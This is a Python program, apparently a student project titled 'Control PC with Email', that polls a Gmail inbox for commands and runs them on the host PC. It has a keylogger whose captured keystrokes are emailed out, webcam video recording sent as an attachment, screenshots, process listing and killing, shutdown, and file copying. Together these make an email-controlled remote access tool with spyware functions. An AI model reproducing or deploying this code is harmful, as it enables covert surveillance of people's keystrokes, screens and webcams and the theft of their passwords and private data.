import os
import email
import imaplib
import smtplib
import time
import pyautogui
import psutil
import threading
import cv2
import shutil
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener 
from tkinter import *
from tkinter.ttk import *
# from tkinter import ttk
# import tkinter.ttk as exTk
import tkinter as tk
from tkinter import messagebox

# recerive email
email_receive = ''
password_receive = ''
HOST = 'imap.gmail.com'
# login to receive 
# connect to the server and go to its inbox
RECEIVE = imaplib.IMAP4_SSL(HOST)

# send email
smtp_ssl_host = 'smtp.gmail.com'
smtp_ssl_port = 465
from_addr = ''
to_addr = ''
# login to send 
SEND = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)


PATH_SCREENSHOT = 'Material/screenshot.jpg'
PATH_CAPTUREVIDEO = 'Material/capturevideo.mp4'


def sendMessage():
    SEND.sendmail(from_addr, to_addr, message.as_string())
    print('Done send\n\n')

# screenshot
def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(PATH_SCREENSHOT)
    with open(PATH_SCREENSHOT, 'rb') as f:
        img_data = f.read()
    message.replace_header('Subject', 'Reply Request Screenshot')
    image = MIMEImage(img_data, name=os.path.basename(PATH_SCREENSHOT))
    message.attach(image)
    sendMessage()

# shutdown
def shutdown():
    os.system("shutdown /s /t 10")

# restart
def reset():
    os.system("shutdown /r /t 10")

# list_apps
def list_apps():
    ls1 = list()
    ls2 = list()
    ls3 = list()

    cmd = 'powershell "gps | where {$_.mainWindowTitle} | select Description, ID, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}'
    proc = os.popen(cmd).read().split('\n')
    tmp = list()
    for line in proc:
        if not line.isspace():
            tmp.append(line)
    tmp = tmp[3:]
    for line in tmp:
        try:
            arr = line.split(" ")
            if len(arr) < 3:
                continue
            if arr[0] == '' or arr[0] == ' ':
                continue

            name = arr[0]
            threads = arr[-1]
            ID = 0
            # interation
            cur = len(arr) - 2
            for i in range (cur, -1, -1):
                if len(arr[i]) != 0:
                    ID = arr[i]
                    cur = i
                    break
            for i in range (1, cur, 1):
                if len(arr[i]) != 0:
                    name += ' ' + arr[i]
            ls1.append(name)
            ls2.append(ID)
            ls3.append(threads)
        except:
            pass
    data = ''
    for i in range(0, len(ls1)):
        data = data + 'Name Application: ' + ls1[i] + ', ID: ' + ls2[i] + ', Count Threads: ' + ls3[i] + '\n'
    text = MIMEText(data)
    message.attach(text)
    message.replace_header('Subject', 'Reply Request List Apps')
    sendMessage()

# list_processes
def list_processes():
    ls1 = list()
    ls2 = list()
    ls3 = list()
    for proc in psutil.process_iter():
        try:
            # Get process name & pid from process object.
            name = proc.name()
            pid = proc.pid
            threads = proc.num_threads()
            ls1.append(str(name))
            ls2.append(str(pid))
            ls3.append(str(threads))
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    data = ''
    for i in range(0, len(ls1)):
        data = data + 'Name Processes: ' + ls1[i] + ', ID: ' + ls2[i] + ', Count Threads: ' + ls3[i] + '\n'
    text = MIMEText(data)
    message.attach(text)
    message.replace_header('Subject', 'Reply Request List Processes')
    sendMessage()

# kill apps/ process
def kill(pid):
    cmd = 'taskkill.exe /F /PID ' + str(pid)
    a = os.system(cmd)
    message.replace_header('Subject', 'Reply Request Kill App/ Process')
    if a == 0:  # OK
        text = MIMEText('Done kill app/ process ID = ' + pid)
        message.attach(text)
    else:       # FAIL
        text = MIMEText('Error kill app/ process ID = ' + pid)
        message.attach(text)
    sendMessage()

# keylogger
def getkey(key):
    global cont, flag
    if flag == 1:
        tmp = str(key)
        if tmp == 'Key.space':
            tmp = ' '
        elif tmp == '"\'"':
            tmp = "'"
        else:
            tmp = tmp.replace("'", "")
        cont += str(tmp)
    return

def listen():
    with Listener(on_press = getkey) as listener:
        listener.join()  
    return

def keylogger(request):
    global cont, flag
    if (request == 'hook'):
        cont = " "
        threading.Thread(target = listen).start() 
        flag = 1
    else:
        flag = 2
        message.replace_header('Subject', 'Reply Request Keylogger')
        text = MIMEText(cont)
        message.attach(text)
        sendMessage()

# send video
def sendVideo():
    message.replace_header('Subject', 'Reply Request CaptureVideo')
    attachment = open(PATH_CAPTUREVIDEO, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % "capturevideo.mp4")
    message.attach(part)

def captureVideo(T): 
    # T is default time
    # Create an object to read camera video
    cap = cv2.VideoCapture(0)

    # Check if camera opened successfully
    if (cap.isOpened() == False):
        print("Camera is unable to open.")
    # Set resolutions of frame.
    # convert from float to integer.
    frame_width = int(cap.get(3)) #640
    frame_height = int(cap.get(4)) #480
    # Create VideoWriter object.
    # and store the output in 'capturevideo.mp4' file in folder CaptureVideo
    x = 30 #number frame on seconds
   
    video_cod = cv2.VideoWriter_fourcc(*'XVID')
    video_output= cv2.VideoWriter(PATH_CAPTUREVIDEO,
                        video_cod,
                        x,
                        (frame_width,frame_height))

    d = 0 #count number frame
    while(True):
        ret, frame = cap.read()
        d = d+1
        if ret == True:
            # Write the frame into the file  'capturevideo.mp4' in folder CaptureVideo
            video_output.write(frame)
            #stop the loop when the required time is right
            if ( d==T*x):
                break

        # Break the loop
        else:
            break

    # release video capture
    # and video write objects
    cap.release()
    video_output.release()

    # Closes all the frames
    cv2.destroyAllWindows()

    sendVideo()
    sendMessage()

#copyfile
def copyFile(src, dst):
    message.replace_header('Subject', 'Reply Request Copy File')
    #preprocessing Destination file address to check 
    dst_check = dst
    basename = os.path.basename(dst)
    if ('.' in basename):
        dst_check = os.path.dirname(dst)
    text = ''
    
    if (os.path.exists(src) == False):
        text = 'Source file address: ' + src + ' is false!!'
    elif (os.path.exists(dst_check) == False):
        text = 'Destination file address: ' + dst +  ' is false!!'
    else:
        shutil.copy(src, dst)
        text = 'Done copy file from ' + src +' to ' + dst 
    
    message.attach(MIMEText(text))
    sendMessage()

# check mail 
def checkMail():
    global message
    try:
        while (True):
            RECEIVE.select('inbox')
            status, data = RECEIVE.search(None, 'UNSEEN')
            mail_ids = []
            for block in data:
                mail_ids += block.split()

            for i in mail_ids:
                status, data = RECEIVE.fetch(i, '(RFC822)')

                for response_part in data:
                    if isinstance(response_part, tuple):
                        msg = email.message_from_bytes(response_part[1])

                        mail_from = msg['from']
                        mail_subject = msg['subject']

                        if msg.is_multipart():
                            mail_content = ''

                            for part in msg.get_payload():
                                if part.get_content_type() == 'text/plain':
                                    mail_content += part.get_payload()
                        else:
                            mail_content = msg.get_payload()
                        print(f'From: {mail_from}')
                        print(f'Subject: {mail_subject}')
                        print(f'Content: {mail_content}')
                        request = mail_content.rstrip().split()

                        # set infor send
                        message = MIMEMultipart()
                        message['From'] = from_addr
                        message['To'] = ', '.join(to_addr)
                        message['Subject'] = 'Subject'

                        # check request
                        if (request[0] == 'screenshot'):
                            screenshot()
                        elif (request[0] == 'shutdown'):
                            shutdown()
                        elif (request[0] == 'reset'):
                            reset()
                        elif (request[0] == 'list' and request[1] == 'apps'):
                            list_apps()
                        elif (request[0] == 'list' and request[1] == 'processes'):
                            list_processes()
                        elif ((request[0] == 'kill') or (request[0] == 'stop')):
                            pid = int(request[1])
                            kill(pid)
                        elif (request[0] == 'keylogger'):
                            hook = request[1]
                            keylogger(hook)
                        elif (request[0] == 'capturevideo'):
                            timeCap = 10 # default time
                            if (len(request) > 1):
                                timeCap = int(request[1])
                            captureVideo(timeCap)
                        elif (request[0] == 'copyfile'):
                            copyFile(request[1], request[2])
                        elif ((request == 'quit')):
                            return
            time.sleep(5)
    except:
        print('stop')
        return

# run server when click button Run
def runServer(entryEmailReceiveRequest, entryPWReceiveRequest, entryEmailReceiveRespond):
    global from_addr, to_addr, email_receive, password_receive
    # SEND = smtplib.SMTP_SSL(smtp_ssl_host, smtp_ssl_port)
    email_receive = entryEmailReceiveRequest.get()
    password_receive = entryPWReceiveRequest.get()
    from_addr = email_receive
    to_addr = [entryEmailReceiveRespond.get()]
    SEND.connect(smtp_ssl_host, smtp_ssl_port)
    try:
        # login to receive
        RECEIVE.login(email_receive, password_receive)
        # login to send
        SEND.login(email_receive, password_receive)
    except:
        print('login error')
        messagebox.showinfo('Notice', 'Email/ Password is incorrect')
        return
    # check mail to receive, implement, send
    print(1)
    checkMail()

# stop server when click button Stop
def stopServer():
    print('stop')
    return

# close server when click button Close
def closeServer():
    window.destroy()

# UI widge 
class Main_UI(Canvas):
    def __init__(self, parent):
        Canvas.__init__(self, parent)
        self.configure(
            #bg = "#FFFFFF",
            height = 200,
            width = 500,
            bd = 0,
            relief = "ridge",
            highlightthickness = 0,
        )
        self.place(x = 0, y = 0)
        self.labelGmailReceiveRequest = Label(self, text = 'Gmail Account Receive Request')
        self.labelEmailReceiveRequest = Label(self, text = 'Enter Emall: ')
        self.entryEmailReceiveRequest = Entry(self, width = 50)
        self.labelPWReceiveRequest = Label(self, text = 'Enter Password: ')
        self.entryPWReceiveRequest = Entry(self, width = 50)

        self.labelGmailReceiveRespond = Label(self, text = 'Gmail Account Receive Respond')
        self.labelEmailReceiveRespond = Label(self, text = 'Enter Emall: ')
        self.entryEmailReceiveRespond = Entry(self, width = 50)
    
        self.buttonRun = Button(self, text = 'Run', 
                                command=lambda: runServer(self.entryEmailReceiveRequest,
                                                          self.entryPWReceiveRequest,
                                                          self.entryEmailReceiveRespond))
        #self.buttonStop = Button(self, text = 'Stop', command = stopServer)
        self.buttonExit = Button(self, text = 'Exit', command = closeServer)

        self.labelGmailReceiveRequest.grid(row = 0, column = 0, pady=5)
        self.labelEmailReceiveRequest.grid(row = 1, column = 0, pady=5)
        self.entryEmailReceiveRequest.grid(row = 1, column = 1, pady=5)
        self.labelPWReceiveRequest.grid(row = 2, column = 0, pady=5)
        self.entryPWReceiveRequest.grid(row = 2, column = 1, pady=5)
        self.labelGmailReceiveRespond.grid(row = 3, column = 0, pady=5)
        self.labelEmailReceiveRespond.grid(row = 4, column = 0, pady=5)
        self.entryEmailReceiveRespond.grid(row = 4, column = 1, pady=5)
        self.buttonRun.grid(row = 5, column = 1, pady=5, sticky = 'w')
        #self.buttonStop.grid(row = 5, column = 1, pady=5)
        self.buttonExit.grid(row = 5, column = 1, sticky = 'e')

# UI server
window = tk.Tk()
window.title('Control PC with Email')
window.geometry('500x200')
window.resizable(width=False, height=False)
f1 = Main_UI(window)
f1.place(x = 0, y = 0)

# close program
SEND.quit()
window.mainloop()